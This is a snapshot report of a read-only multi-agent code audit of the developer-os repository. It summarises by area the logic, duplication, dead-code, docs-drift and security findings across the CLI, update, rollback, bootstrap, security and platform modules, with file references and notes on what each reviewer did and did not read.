# Full repository audit — 2026-10-05

Read-only multi-agent audit of `development` at `5a7462a9`, run in two waves (71 agents). Line numbers refer to `5a7462a9`. Later commits (from `674a0a8e` onward) may shift them. This report is a snapshot. `aca8e277` rechecked every finding against `4c4150ab` and folded the open ones into `BACKLOG.md` as NEW-147..NEW-188. Track status there, not here.

- **Wave 1** used 12 area reviewers, 4 cross-cutting flow tracers, 2 mechanical sweeps, one adversarial skeptic per area and a completeness critic.
- **Wave 2** read about 26k lines of the heaviest modules line by line (bootstrap executor, transaction executor, update compose/planning/ports, core update rollback/construction/planner, uninstall, the security update and git processes). It also closed the critic's gaps. Each batch had its own skeptic.

Baseline `tsc -b` and `eslint .` were green. Vitest was not run. Every finding cites `file:line` and quotes the current code. Rows already in `BACKLOG.md` were excluded or cross-referenced, and cross-area duplicates were merged.

**Totals:** 166 findings (P0 1, P1 3, P2 26, P3 136). 27 findings were refuted by the verifiers.

By kind: logic 32, duplication 31, dead-code 29, inconsistency 26, flow 19, docs-drift 15, security 10, test-gap 4

## Area summaries

- **CLI-CMD**: CLI-CMD scope (main/bin/io/context/config-file plus commands/**) is strict and well-guarded at argument parsing, with a single emit/publish output path and a consistent exit-code taxonomy. The material problems are one command contract that is not honoured (a failing `doctor` loses its report and never renders instructions, contradicting its own docstring and foundation.md 12.6), a few inconsistent security-boundary behaviours across commands (raw `paths` in two hand-built failures, no agent-session guard on `review`), and recurring duplication (about 10 copies of `isMissingEntry`, three copies of admit/lock helpers with one behavioural fork, four copies of the ephemeral-key redactor). I did not run tests, per the read-only rule. _(dropped by cap: 3)_
- **CLI-UPD**: I read apps/cli/src/update/recovery.ts, coordinator.ts, apply.ts, rollback-apply.ts and entrypoint.ts in full, plus targeted sections of apply-ports.ts and compose.ts. I did not read the other ~15k lines, including the large bodies of compose.ts, apply-ports.ts, planning.ts, construction.ts and bundle-source.ts, so a clean result there is not implied. The recovery routing, the executor-record protocol and the envelope removal order (journal, then lock, then plan) are internally consistent and match the documented states. Everything I found is dead code, duplicated helpers, or constants hardcoded instead of imported from core. I found no logic bug in the files I read.
- **CLI-LIFE**: CLI-LIFE (hooks, lifecycle, bootstrap, instructions) is carefully built. Hook guards, firing records, the instruction attach/detach planners and the Codex registration flow were read fully and held up. I read the mutation gate and the manifest-anchor and runtime-record files closely, and the rest of lifecycle and bootstrap only in part: executor.ts (3.8k lines), report.ts, journal-store.ts and uninstall.ts were sampled by search and spot reads, not read end to end. I found one real logic gap (firing-record wait budget for long-running hooks), one security-relevant ambient bypass flag, and a few duplication and dead-code items. Nothing already tracked in BACKLOG was re-reported. _(dropped by cap: 3)_
- **CORE-LIFE**: packages/core/src/lifecycle is a journaled coordinator, ledger, recovery and compaction engine for Spec 1 §2.4 and Spec 2 §9.2. It is carefully built: the grammar, journal validation, allocator, store and ledger agree with each other and with the CLI callers I traced (git, automation, uninstall, mutation-gate). I found no unused exports in the lifecycle files or its index barrel. The one logic concern is how the coordinator handles a Foundation participant that fails mid-apply, plus a latent mismatch between compaction and the ledger. The rest is duplicated guard helpers and three constants that only tests use. I did not run vitest, per the rules. _(dropped by cap: 3)_
- **CORE-UPD**: I read versions/index.ts, scalars.ts, capacity.ts, paths.ts, retirement.ts, owner.ts and the release.ts trust, selection and index logic in full. I also read the coordinator journal state machine and engine, and skimmed preview.ts and planner.ts. I found no logic bug in release-trust advance/admit, the coordinator journal table, or the compensation cursor. The module is carefully fail-closed. The material findings are duplication and dead-surface problems: a no-LF domain hash reimplemented in many files, a second semver comparator, validator helpers copied per file, and a few exports only tests call. I did not read rollback.ts, migrations.ts, construction.ts or bundle-participant.ts line by line, and read only part of planner.ts, preview.ts and participants.ts.
- **CORE-REST**: CORE-REST is mostly carefully hardened (strict key checks, bounded reads, TOCTOU-safe journal writes), but I found two real defects: `containsPath`/`containsPathLoosely` misclassify any child whose name starts with `..` (which fails open for excluded roots), and `ManifestStore` swallows validator code defects that NEW-92 deliberately made escape. The rest is duplication of bounded-read and shape helpers, and a few exports and methods with no production callers. I read manifest/{v2,store,drift,instruction-block}, transactions/{store,recovery,executor core paths}, config/{loader,keys,paths,segment}, plans/validate, hooks, instructions, agent-prompt, capabilities and the Result module in full. I skimmed git/ and the bootstrap manifest files and did not review them line by line. Nothing was executed except a one-line node check of the relative-path predicate.
- **BRAIN**: The Brain package is small, pure and heavily commented. The capture, review, ingest, index, retrieval, lint, garden and refactor modules are mutually consistent, and the nine ingest validators cover case and normalization collisions. The one real security gap is that the session-start injection trusts a path read from an editable index.json. There is also one fragile cross-module parse (garden gap tags recovered from lint message text), a garden `fix` kind that is validated and advertised but never offered, and a refactor limitation that is not signalled. The remaining findings are duplication, dead code and documentation drift. I did not run vitest, as instructed. _(dropped by cap: 3)_
- **SEC**: packages/security holds the product's trust boundaries: path canonicalization and protected-name policy, argv screening, the NodeProcessRunner and SupervisedProcessRunner, redaction, root-owned system-executable admission, the closed Git process table and exec gateways, and update signature, transport and archive admission. The parts I read are in good shape. Argv slots are closed semantic types with dash refusal. Redirects are pinned to signed origins with a single hop, exact Content-Length and the signed hash. The zstd/ustar parser accepts exactly one canonical spelling. The Ed25519 chain checks key ids against the raw keys. All three raw spawn callers outside the package use fixed executables. I found no CRITICAL or HIGH issue. What is left is a stale FD-inheritance capability, an overstated identity check in readText, and dead or misleading exports. Not fully read: git/supervisor.ts, git/local-receive.ts, git/pack-reader.ts, update/scratch.ts, update/planner-process.ts, update/verifier-process.ts and the body of redaction.ts (already well tracked by NEW-120/NEW-130). git/shadow.ts was only grep-scanned: every create uses O_EXCL|O_NOFOLLOW. Severity counts (security kind only): CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 1. _(dropped by cap: 2)_
- **MACOS**: packages/platform-macos is a dense, defensively written package (launchd plan/plist/observe/bootstrap/effects, locks, retained rename, system-executable table, launcher admission). I found no crash-level logic bug in the launchd lifecycle or the lock/rename code, and there is no keychain code in scope. The material issues are contract drift: a hash-bound argv table that no executor reads, two incompatible executable-trust policies, an error taxonomy that breaks the CLI's exit-code contract, and several duplicated helpers whose copies have already diverged. A few dead exports, fields and params remain. _(dropped by cap: 3)_
- **ADAPT**: Read-only review of adapter-claude, adapter-codex and launcher. The adapters are well-factored: version tables, tablePermits, discover and security screens already live in core/security, and the parity gaps I found (no ClaudeAdapter facade, Claude has no --output-schema, scratch workspace only on Codex) are all documented in claude-adapter.md/codex-adapter.md. Launcher stubs are tracked in NEW-111/112. The material new findings are a launcher FD 3 handoff failure path that orphans the child and loses its exit code (latent today), and a test-only Codex helper with a dead default.
- **SCHEMA**: The SCHEMA area (workflow-schema package, 11 workflows, templates, instructions) is in good health. Scope derivation, contract validation, the embedded-template parity tests, and the instructions catalog all agree with the files on disk. The architecture-doc line citations I spot-checked are correct. I found four minor issues. The only one that misdirects a user is a drift message that names a CLI command which does not exist. No blockers. I did not run vitest or edit files.
- **TEST**: Read-only audit of the test scope. No test or vitest run was made, per the rules. The lane partition is sound: all 21 `*.v2.test.ts` files fall into uninstall (4), core (6) or rest (11), and the update-recovery `deaths` and `rest` regexes are exact complements. No export in tests/helpers, tests/security/helpers.ts or tests/repository is unreferenced, and no test file lacks assertions. Findings: the `-t` lanes have no zero-match guard, CI cases that skip silently on hosted runners are only partly disclosed, local gates use a stale `dist`, and one manual vendor test cannot fail on its stated contract. Verdict: UNVERIFIED, because I did not run the suite and these four gaps are untested.
- **FLOW-INIT**: I followed the chain from init through the Claude/Codex hook render, runHookMode and firing records, then doctor, capture, review, ingest and reindex, and finally brain search and SessionStart inject. The capture → review → ingest → index chain is consistent: there is one artifact renderer, `_raw` is excluded from discovery, every redactor carries the user's patterns, and `failed` comes only from an unreadable envelope. The hook-observation half has real contract breaks. (1) Firing records never reach the capability matrix that hooks.md §3.6 says they drive. (2) The 1.5 s exit budget abandons the record write for any slow verb (`stop`, `format`). (3) The 24 h refresh shortcut contradicts doctor's 'record older than hooks.json' test. (4) The inject path sends vault text to the vendor redacted with the built-in classes only, not the user's configured patterns. _(dropped by cap: 2)_
- **FLOW-UPD**: The update flow works like this. pack-local-release writes an unsigned-local release that init installs. `update` then reads the launcher's FD 3 offline trust, fetches and verifies signed metadata (security transport and signatures), runs the target planner on verified scratch, builds a V2 coordinator (CLI compose and core), and applies it. Recovery heals residue through closure V2, and the launcher routes on active-release.json and update-executor.json. The core contracts agree with each other: paths, size bounds, store-set equality, retirement of shared metadata, and the executor record protocol all match. The integration seams do not. Today the CLI's FD 3 reader aborts Node on every `update` run. Recovery resumes a coordinator of the other operation. Nothing in the update path rewrites the version-free entrypoint.
- **FLOW-UNINST**: The uninstall flow has four arms: the V1 Foundation revert, the V2 coordinator (detach, then the drained uninstall with launchd unload), resuming an uninstall whose manifest is already gone, and the absent-manifest arm. They are guarded carefully against races and symlinks, and the launchd unload is planned before any ID is reserved. The weak point is between the modules, not inside them. About 25 refusals send the user to `developer-os doctor`, but doctor never reads the lifecycle ledger, the coordinator journals or the uninstall marker. After an interrupted V2 uninstall it sends the user into a doctor/repair loop or to an `init` that refuses. `uninstall --yes` also detaches vendor instructions and unregisters Codex before the drift and capacity checks that can still refuse. _(dropped by cap: 2)_
- **FLOW-DOCS**: The architecture notes (docs/architecture/*.md) and release records (docs/releases/*.md) are mostly accurate on constants, bounds and contracts. I spot-checked about 40 named constants, including hook limits, import caps, the update/rollback bounds and instruction bounds, and every one matched the code. The drift is concentrated in two places. First, the A13 hooks reversal and the A13 Task 14/15 completion were written into hooks.md but never carried into codex-adapter.md, claude-adapter.md, knowledge-pipeline.md §2 or vendor-invocation.md, so those notes still say hooks are declined or pending. Second, statements written when Foundation closed (foundation.md §1/§7/§8.9) and the workflow-schema trigger rule (§7.2) were not updated when later phases contradicted them. The path:line citation standard in threat-model.md and knowledge-pipeline.md has also drifted widely, because the citation gate only checks that a cited line exists, not what it says. _(dropped by cap: 1)_
- **DEAD**: I scanned every workspace package for dead code and unused dependencies. First I ran tsc with noUnusedLocals/noUnusedParameters, using temp tsconfigs in the scratchpad that point typeRoots at the repo's @types. Then I counted references to each exported symbol across all tracked files, looked for src files that nothing imports, compared manifests with the actual import specifiers, and checked that every CLI option and config key is read somewhere. The workspace is in good shape. No src file is orphaned: the only unimported files are the declared entry points (bin.ts, launcher main.ts, the package index.ts files and core/planner-protocol.ts). Every declared workspace and third-party dependency is imported, and every parsed CLI option and config key is read in production. The real problems are a few helpers that production never calls, which hide either a missing feature (doctor's per-artifact instruction lines) or a constant copied into another module (the compaction bounds, the git-gated job), plus a short tail of unused parameters, exported types nothing references, and drift in the toolchain version pins. Planner-protocol code that only Task 11b will call (planBrainSchemaMigrations, encodePlannerInput/decodePlannerInput/encodePlannerOutput, adapter *TargetEntries) is left out because NEW-111 tracks it. _(dropped by cap: 8)_
- **RENDER**: The render pipeline and catalog are consistent: rendering in memory through the compiled tests/dist/contracts/adapters/{claude,codex}/render-all.js gives exactly what is committed (claude 35/35 files, codex 25/25, no differing files, no extra files). instructions/catalog.json has 33 rows for 33 files on disk, and the 11 workflows/* map one-to-one to the 11 developer-os-* skills in each vendor tree. The founder's installed ~/.claude/skills/developer-os matches the render, apart from the user overrides under ~/.developer-os/instructions/*/skills and the install-time hooks/. The defects that remain are in what the render means: the thin commands hide the skill descriptions, the review contract renders a call the CLI always refuses, the doctor matrix calls the shipped agents unused, and some adapter docs and comments are stale.
- **W2-BOOT-A**: I read apps/cli/src/bootstrap/executor.ts lines 1-1910 in full: the module helpers, lock acquisition and release, preview, plan and planFreshInit, executeFreshInit, completedOutcome, previewPaths and the start of buildPlan. To judge correctness I also read code outside that range: retainTerminal (3777-3831), the start of compensate (3649-3720), createPlannedPath's global-lock arm (3050-3120), guardReadOwnedFile (2699-2734), journal-store current/advance/#assertAuthority, and the createdPaths construction (2075-2110).

The main finding (W2-BOOT-A-1) is confirmed by a node probe against the built dist: /private/tmp/claude-501/-Users-msolecki-www-developer-os/4885558d-d168-4514-bf24-98cb22ab576b/scratchpad/probe-admitted-lock.mjs, which uses createCommandFixture with a temporary home. A plan that admits a pre-existing state/.lifecycle.lock rolls back before its first created path and then can never be retained. Recovery wedges for good on "terminal retention lock reachability is unbound".

I checked and dropped one more concern: a stale in-memory journal when a store is opened before the bootstrap lock. It fails closed, because advance re-reads both slots in #assertAuthority. Nothing here matches a known.json entry or a BACKLOG row.
- **W2-BOOT-B**: I read all of apps/cli/src/bootstrap/executor.ts from line 1900 to the end (line 3832), line by line: the tail of the plan build, buildLaunchability, buildManifest, manifestAdmission, the plan/manifest admission contexts, journal I/O, the guarded file readers, payload staging, createPlannedPath, createOrdinary, admittedFoundation, foundationPublicationParent, applyFoundation, publishLaunchability, manifest publication, verify, compensate and retainTerminal. To judge the recovery paths I followed calls outside the range: executeFreshInit at lines 1645-1700, terminalJournal at 841-865, the journal transition grammar in packages/core/src/manifest/bootstrap-retention.ts at 453-747, journal-store advance, projectBootstrapRetentionPostimage, core executeBootstrapFoundationParticipant, and the executor.test.ts failure-injection cases.

The main result: the compensation (rollback) path cannot finish in several reachable states. (1) Resuming a compensation that stopped part-way through a payload step always fails, because the executor ignores the payloadRetentionPart value already saved in the journal. (2) The core grammar has a dedicated branch for compensating from payloadWriteState=create_intent, but the executor never uses it. (3) Where each payload now lives is worked out only from the journal cursors, so a failure after a rename but before the cursor advances (including a failure inside the Foundation forward participant) makes compensation look in the wrong place and refuse every time. (4) An out-of-range point at line 1664: resuming a compensation from the payload stage first requires the packaged release to still be readable. The tests inject failures only at after_global_lock, during_payload_write and after_foundation, so none of these windows is covered. No related NEW id is tracked in BACKLOG.md; the nearest are NEW-133 (retention performance) and NEW-100 (deferred round-trip gate). Lower-value items I dropped: the placeholder {dev:"1",ino:"1"} in manifestPlanAdmission.bootstrapPayloadIdentity (the identity is not compared in that path), the unexplained constants in maximumStagingEntries, death points matched with endsWith("/release-trust.json"), and assertCompleteManifest reading through nodeFs.readFile after lstat with no O_NOFOLLOW. _(dropped by cap: 4)_
- **W2-BOOT-C**: Read both files in full, line by line: apps/cli/src/bootstrap/journal-store.ts 1-934 and apps/cli/src/bootstrap/report.ts 1-1790. To judge correctness I also followed calls out to executor.ts (storeFor 906-937, terminalJournal 841-866, preliminaryJournal 867-904, the post-lock comparison 1525-1580), context.ts 225-258, and core bootstrap-retention.ts (classifyBootstrapEvidence, assertBootstrapRetentionCapacity, reconstructRetentionTerminal). The journal store's persistence protocol held up on every crash point I traced. Writes go into the inactive slot through truncate, write, sync and reopen-verify. A torn slot decodes to null and the other slot stays current. The empty-slot fallback in open() only rewrites slot 0 when slot 1 has no bytes. I found no material atomicity defect. The main finding is a contract mismatch between the report and the executor: the report classes an envelope as resumable when both slots decode to null, but the store refuses to resume it when slot 1 holds any bytes. That loops the user between "resume with init" and a failing init. It is only reachable through external modification or disk corruption. The other findings are duplication or dead code: three copies of the terminal-journal reconstruction with different guards, a dead ManagedDriftError class, an unreachable capacity re-check, and gate-loop error swallowing that differs from the isCodeDefect convention its siblings use. No vitest run or probes were executed; every finding is supported by the code itself. No BACKLOG row tracks any of these. NEW-123, NEW-83 and NEW-92 are related. _(dropped by cap: 3)_
- **W2-TX-A**: I read every line of packages/core/src/transactions/executor.ts from 1 to 1550. To judge correctness I also read these parts outside the range: 1551-2205 (execute, the three foundation bridges, the bootstrap state walk, resume), 2363-2602 (directories, pruneBackups, writeStaged, backUp), 2965-3076 (transition and transitionBootstrapFoundationInPlace), store.ts (validateJournal, transition), the update scalars, owner-participant.ts, the CLI bootstrap callers, and the related core and CLI tests. I ran no node probe; every claim below comes from reading the code.

The admission capabilities hold. Each WeakMap-held retained snapshot is cloned before the callbacks run, and the parent and inode identity checks fail closed. The bootstrap rewrite-in-place crash windows (truncate, partial write, sync, close, reopen) recover idempotently, because publishBootstrapMutationNoReplace accepts both the source-present and the destination-present state, and tests pin all six fault points.

I checked two things that looked like defects and are by design. First, the bootstrap compensation participant walks its journal to finalized without removing any target. The CLI test "retains post-Foundation rollback targets ... without invoking deletion authority" pins this, so it is not reported. Second, update payload ordinals are only checked to be distinct within one mutation, not across mutations. Upstream construction (migrations.ts:348) uses the same rule and a collision fails closed, so it is not reported.

The one material finding is a mismatch between what the journal writers persist and what the re-entry check accepts. The writers store any clock value as updatedAt, but exactBootstrapFoundationJournalShape requires updatedAt >= createdAt. After a wall-clock step backwards, re-entering any of the three Foundation bridges then fails with TransactionStateError permanently. The other findings are low severity: a temp-file leak on the write-failure path of writeDurableFile, a redundant flag that hides the rewind to planned, duplicated predicates and validation logic inside the file, one parameter that never varies, and a misplaced, out-of-date docblock.
- **W2-TX-B**: Read packages/core/src/transactions/executor.ts lines 1550-3076 in full (execute, the three Foundation participant entry points, publication helpers, resumeBootstrapFoundationLocked, resume/resumeLocked, rollback/rollbackLocked, validatePlan, snapshot, pruneBackups, backUp/stage/validate/apply/applyMutation, verifyDesired, restoreMutation, readArtifact, metadata helpers, transition, transitionBootstrapFoundationInPlace, runHook). Out-of-range spans opened to judge correctness: executor.ts 915-955, 1033-1160, 1290-1424, 1475-1515; store.ts 202-351 (lock re-entrancy is correct; write is tmp+rename); recovery.ts; repair.ts, doctor.ts and init.ts excerpts. No vitest or node probes were run. The top finding (a repair on a tx_fi_ id breaks the bootstrap inode binding) is PLAUSIBLE: the static chain is complete, but it is not confirmed by a probe. The other findings are confirmed by grep. Dropped as not material: lifecycle and update final-only branches skip syncReopenDirectory where the bootstrap arm runs it; assertTarget drops the guard error's cause. _(dropped by cap: 2)_
- **W2-COMPOSE**: I read all of apps/cli/src/update/compose.ts, lines 1-2006, every function. To judge correctness I followed calls into apps/cli/src/update/planning.ts (prepareInverse, codexEffectOf, ownerRollbackPreview, planRollback), apply-ports.ts (codexPlanningState, retainedRollbackSet), codex-refresh.ts, instructions/codex-registration.ts, and core's update/coordinator.ts (deriveUpdateSteps), rollback.ts, construction.ts (frame/consumer validation), migrations.ts and participants.ts (slots).

Checks that came out consistent: the prefix allocation matches the composer's take order for both operations, including tx refCount against the actual changed ops and the +1 for Codex registration. Plan counts (12 for apply, 9 for rollback) match the leaf lists. The rollback-source entry walk matches prepareInverse's order and its zero-byte skip. Duplicate planner-output ordinals are allowed by core's frame-consumer check.

Two material defects were found, both on the `update rollback --apply` path:
1. The rollback never rewrites the Codex registration record (codex/registration.json), so after a successful rollback that record still names the update's tree hash. Doctor then reports `stale`, and the next update refuses.
2. The retained exactStepListHash is computed at apply but never compared at rollback, although Spec 2 requires it.

Two low-severity duplications are also reported. Nothing overlaps known.json (CORE-UPD-6 compareUtf8 and CLI-UPD-3's 16_384 were already reported) or a BACKLOG row. Dropped as immaterial:
- the Codex registration `create` at line 1191 is not observed under the lock (the Foundation create would catch it at execution);
- OWNER_APPLY_SLOTS/OWNER_ROLLBACK_SLOTS restate core's private OWNER_SLOTS (core validates them, so drift fails loudly);
- `MANIFEST_BYTES_MAXIMUM * 4` is a misleading name for 64 MiB. _(dropped by cap: 3)_
- **W2-UNINST**: I read all of apps/cli/src/lifecycle/uninstall.ts (lines 1-1992). To judge correctness I followed calls out of range into: commands/uninstall.ts (partition, planUninstall, removeDirectories, the V1 revert and the V2 command run at 746-830), lifecycle/uninstall-recovery.ts (dispatchUninstall, admitV2Home), lifecycle/mutation-gate.ts (requireLifecycleStagingRoot, cleanAllocatorTemp, allocatedIdsFrom), core lifecycle/recovery.ts (the recover loop and assertRecoverable), coordinator.ts (forwardOnce, step hooks, drain step), grammar.ts (the uninstall point of no return is manifest_commit_absence), platform-macos stable-lock.ts (acquireExistingWithin is all-or-throw and throws LifecycleLockMissingError on an absent path), admission.ts (reservation rows), the bootstrap executor's manifest rows and core manifest/v2.ts (existedBefore). I left out wave-1 items FLOW-UNINST-1..6, MACOS-*, CORE-LIFE-2 and NEW-100. Two leads were rejected after checking. (a) V2 uninstall never honours existedBefore: only instructions/attach.ts sets it, on vendor-home rows outside ownedRoots, so the gap is latent. (b) A Brain under the product home being rmdir'd by finalizeUninstallTombstones: the default Brain is outside the product home. The two most material findings are a stale-manifest gap between admission and the locked plan, and a missing runner lease that is only discovered after the marker and launchd bootout.
- **W2-ROLLBACK**: I read all of packages/core/src/update/rollback.ts (lines 1-1738), every function. I followed calls out of the file only where I needed them to judge correctness: bundle-participant.ts cursor helpers (structureTop, entryTop, nextEntryCompensation, advanceEntry, checkPlanBounds); the CLI executors apps/cli/src/update/rollback-publication.ts (lines 120-468) and rollback-source.ts (lines 343-484); the retained-rollback reader in context.ts (lines 425-500); the compose.ts rollback and retirement paths (lines 755-830, 1010-1033, 1440-1455); retirement-resolve.ts; and spec §3.2 and §(4451).

The build, codec and state-machine logic is internally consistent. Specifically:
- Compensation cursors, compaction targets (2N+10 and N), the N+7 retirement count and the order in which the forward phases create things all agree.
- The CLI binds every create_intent before `compensate`, so compensation that starts at created-top leaks nothing.

The material problems are on the consuming side of the retained payload:
- **Step-list hash never checked:** the hash Spec 2 requires to match at manual rollback is written but never compared.
- **Rollback binding never recomputed:** after build time, nothing recomputes the binding; the retained reader only checks that fields are equal to each other. A test passes with a synthetic binding hash.
- **Retirement set not matched to the payload inventory:** the inventory-derived retirement set in Core is unused, and production never compares the manifest partition with the payload inventory.

Two smaller findings: the journal-advance functions are looser than their docstrings promise, and publication and source journals reach `rolled_back` in different shapes.

I left out three issues as already tracked or not material: verify-only finalize/compact being allowed in Core but refused by the CLI (handled at apply-ports.ts:617), the dead `rollbackPayloadSourceCompactionComplete` (DEAD-2), and the dead `rollbackPayloadRetirementRef` (CORE-UPD-5).
- **W2-CONSTR**: I read every line of both files: packages/core/src/update/migrations.ts (1-704) and packages/core/src/update/construction.ts (1-1538). To judge correctness I followed calls into migration-planning.ts (checkRow, orderMigrationChain, selectMigrationChain), planner.ts parseMigrations (662-728), paths.ts (the payload and initial-journal derivations), rollback.ts (leafRoles, bindRetainedInversePlan), apps/cli/src/update/planning.ts (406-490), apps/cli/src/update/construction.ts (440-720: frame streaming, intent binding, compensation) and apps/cli/src/update/migration-participant.ts (70-110).

In construction.ts, the journal state machine (the directory/file/evidence intents, the frame/consumer cursor pairing, compensate/compaction) and the bijection validator held up under a line-by-line trace. The CLI's #bindIntents binds an intent that already exists on disk before it compensates, and #removeOuter removes the outer files, so the "unbound create_intent has nothing on disk" comment is safe in practice. I found no material defect there. The known Task 18 local types and the recovery-path divergence are already tracked in BACKLOG Phase 8 and are not re-reported.

The material findings are all in migrations.ts:
1. A node probe against dist confirmed that the execution-journal validator accepts a `compacting` journal with mid-apply or mid-compensation cursors.
2. The "chain starts at the installed version" gate is reachable only from a test.
3. projectRetainedSchemaMigrationInverse has no production caller, and the CLI builds the same persisted projection itself.
4. A minor mode-check inconsistency between the forward and rollback payload checks.

Probe file: /private/tmp/claude-501/-Users-msolecki-www-developer-os/4885558d-d168-4514-bf24-98cb22ab576b/scratchpad/probe-mig.mjs.
- **W2-BUNDLE**: I read both files in full, every line: packages/core/src/update/bundle-participant.ts lines 1-1290 and packages/core/src/update/preview.ts lines 1-596. To judge the transaction contract I also followed these call sites: the CLI executors apps/cli/src/update/bundle-source.ts (lines 350-610: bindEntryIntent, removeBundleEntryPart, #bindIntents, compensate) and apps/cli/src/update/bundle-publication.ts (lines 130-420: apply, publish, verify, bindIntents, compensate, compact, and #stagedSource at 211-226). For preview I followed planner.ts materializePlannerDraft (1150-1248), planning.ts (700-830), release.ts validateBundleManifest and validateIdentity (395-470), and migration-planning.ts SCHEMA_MIGRATION_DOMAIN_ORDER.

The source and publication journal state machines hold together. Each *_intent microstate is bound to a disk identity before `compensate` runs. Compensation tops (entryTop, structureTop, metadataTop, rootTop) match what the executors remove. The compaction cursor ranges (2N+4 for source, N for publication) match their target functions. verify_previous cannot reach any mutation cursor. I found no defect in the transaction contract itself.

The main preview-vs-apply finding is W2-BUNDLE-1. The public preview sorts migrations brain-first, but execution and the inverse leaves in the same file use product_state-first, and the previewHash is computed over the brain-first order.

The other findings are lower impact:
- Bundle-entry validation and its bound constants are duplicated across core and the CLI.
- The owner-preview partition check can never fire.
- The bundle metadata `tombstonePath` field is never read and has its own validation rule.
- SafeRenderedPathV1 is never used.
- The candidate builder binds less of the materialization than its docstring claims.

I considered and did not report the O(N²) cost of bundleEntryParentOrdinal per entry, because the bundle is capped at 200k entries and real bundles are small. Already known and not repeated: CORE-UPD-1 (noLfHash/hashNoLineFeed), CORE-UPD-4 (fail/integer copied per file), DEAD-2 (bundleSourceCompactionComplete).
- **W2-PLANNER**: I read every line of packages/core/src/update/planner.ts (1-1249) and packages/core/src/update/participants.ts (1-1027). Where I needed to judge correctness I followed calls into owner.ts (validateOwnerDraft, checkContent), paths.ts (NFC assertion), migrations.ts (checkUpdateFoundationMutations), coordinator.ts (updateCompensationCursor), manifest/v2.ts, apps/cli/src/update/planning.ts (concreteManifest, codexEffectOf), context.ts (the request snapshot) and compose.ts (#ownerOps, #ownerPlan). Case/NFC folding holds up. paths.ts already rejects non-NFC paths, so the participants check at :432, which only lowercases, matches the planner. Ordering and capacity checks are consistent. I found four material defects. (1) The planner draft protocol has no instruction arm, so an attached instruction row cannot pass through an update. (2) The trust-boundary admission (parseOwnerPlan) is weaker than the strict owner-draft validator validateOwnerDraft, which no current-process code path calls; as a result, the plan-only preview accepts drafts that apply composition later refuses. (3) A second compensation walk in participants.ts is dead and diverges from the live coordinator cursor, and its tests pin the dead version. (4) There are low-value dead exports. I ran nothing; all evidence comes from reading the code. I dropped 4 non-material items: duplicate expected-manifest paths, which v2 validateInventory already catches; the OWNER_ORDER copy, which is plausibly deliberate for the planner graph gate; the copies of the fold helper; and the record() prototype strictness difference, which CORE-UPD-4 covers. _(dropped by cap: 4)_
- **W2-PORTS**: I read apps/cli/src/update/bundle-source.ts lines 1-666 and apps/cli/src/update/apply-ports.ts lines 1-1235 in full. Outside that range I followed calls only as far as needed to judge correctness: core decodeCanonicalJson, the bundle-source journal transitions (compensate/compaction cursors, structureTop/entryTop, bundleSourceCompactionTarget), the allocator id grammar, the decodeExact siblings in construction.ts and journal-store.ts, the coordinator journal read, and runPlanner in update/context.ts. I traced the bundle-source protocol (stage, bindIntents, compensate, compact, removeBundleEntryPart) end to end and found no ordering or idempotency bug. The compensation and compaction cursors line up with core's transition table. The findings below are new, are not in known.json, and are not tracked as NEW rows (NEW-118 covers the releaseEmptyReservation and verifier-snapshot ponytails, so I left those out). Evidence comes from file reads and one node probe of packages/core/dist against synthetic bytes. I ran no tests.
- **W2-PLANNING**: I read every line of apps/cli/src/update/planning.ts (1-835) and apps/cli/src/update/construction.ts (1-801). To judge them I followed calls out of range: core release.ts selectRelease, advanceReleaseTrust and admitReleaseAgainstTrust; core planner.ts parseExpectedManifest, parseOwnerPlan and admitTargetUpdateDraft; validateConstructionBijections frame ordering in core construction.ts; security transport #exchange and its sink guard; the cli context.ts snapshot, observe and readHome; and the compose.ts owner ops.

Six material findings:
1. The concrete post-update manifest is built only from the target draft's expectedManifest. Neither the CLI nor Core binds that row set to the owner partitions. The draft grammar also cannot express `instruction` rows, so a home with attached instructions loses those manifest rows after an update.
2. After a rollback, `update --version <active>` reaches the up_to_date branch and is refused as `update_trust_replay` (exit 5). I confirmed this with a node probe against packages/core/dist: advanceReleaseTrust throws "invalid ReleaseTrustStateV1 release replay".
3. An unsigned-local home is refused only after the network fetch and signature verification.
4. In the finally block, a failing scratch cleanup replaces the planning refusal and its exit code.
5. selectTarget sorts selectRelease errors into exit codes by matching substrings of their messages.
6. construction.ts recover() hardcodes the envelope file names that core's updateConstructionEnvelopePaths already owns.

I left out these points as not material or as intended defence in depth:
- collect()'s size and hash checks repeat the transport's bounds.
- The up_to_date bundle-manifest recheck at planning.ts:620 is already implied by the identity hash.
- #streamFrames screens each frame twice.
- No CLI test reaches the planner-output refusals in concreteManifest and prepareInverse.
- The +1 on the plan-pending bound.

Related tracked items: NEW-118 (3) covers the codexEffectOf shortcut, which is not re-reported. NEW-118 (4) is the verifier snapshot made from the plan's own digests; it is why finding 1 is not caught at apply. FLOW-UPD-1 covers the FD 3 read order.
- **W2-SEC-UPD**: I read every line of packages/security/src/update/scratch.ts (1-1092), planner-process.ts (1-397) and verifier-process.ts (1-232). To judge correctness I also followed calls into core planner.ts (wire bounds, PlannerWireEncoder/Decoder, PlannerBlobSetHasher at 245-262, 550-565 and 880-1090), participants.ts (TargetVerificationPlanV1 and its validator), redaction.ts (scope handling, 640-680), and the CLI callers (planning.ts 255-280 and 578-690, context.ts scratchPort and runPlanner, apply-ports.ts verifierPort, commands/update/index.ts). I also read spec §7.2 on scratch recovery. The journal grammar, the cleanup-list derivation and cursor bounds, the evidence binding, the O_NOFOLLOW/O_EXCL creates with owner/mode/nlink/identity rechecks, and the wire decoder's frame order and bounds all hold up. I found none of the duplication or parse-bound defects I looked for. That the planner and verifier loops are siblings is a deliberate ponytail and is not reported. There are four material findings. (1) Scratch crash recovery has no liveness proof. Any plan-only `update` sweeps and cleans the live scratch attempts of a concurrent `update`/`update --apply`, and it does so unlocked. (2) The production RSS/descendant sampler fails open: a `ps` error returns null, and both supervisors read null as "process gone" and stop sampling for the rest of the run. (3) After a kill, both supervisors wait on stdout EOF and 'close' with no deadline, so a descendant outside the process group that holds the pipe hangs the CLI. (4) The verifier screens the caller-supplied `snapshot: unknown` with the `path` scope, which turns off high-entropy detection. This is latent until NEW-118(4) lands the real home snapshot. No small node probes were needed: each finding follows directly from the verbatim code cited.
